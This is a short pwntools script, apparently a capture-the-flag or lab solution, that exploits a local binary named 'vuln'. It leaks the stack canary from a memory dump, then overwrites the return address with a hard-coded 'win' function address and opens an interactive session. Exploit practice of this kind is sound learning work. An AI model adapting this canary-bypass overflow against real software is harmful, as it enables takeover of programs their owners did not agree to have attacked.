from pwn import *

# p = process('./vuln')
p = gdb.debug('./vuln', '''
    break main
    break *0x0000000000401300
              break *0x00000000004012e1
              break *0x00000000004012e6
    continue
    continue
''')


WIN_LOC = 0x401216
# WIN_LOC = 0xBBBBCCCC



# 
o = p.recvuntil(b'read?')
print(o)

p.sendline(b'24')

# o = p.recvall(timeout=1)
o = p.recvuntil(b'buf?')
# print(o)

# process o to get the dump (w/ canary)
dump = o.split(b'\n\n')[0]

# print(dump)

p1 = dump[:10]
p2 = dump[10:]

print(f'{p1=}')
print(f'{p2=}')

print(len(p2))


payload = b''
payload += b'A' * len(p1)
payload += p2[:8]
payload += b'B' * 8
payload += p64(WIN_LOC)

p.sendline(payload)

p.interactive()

exit()


# p.sendline(b'A' * 9)


p.interactive()
# print(p.recvall(1))

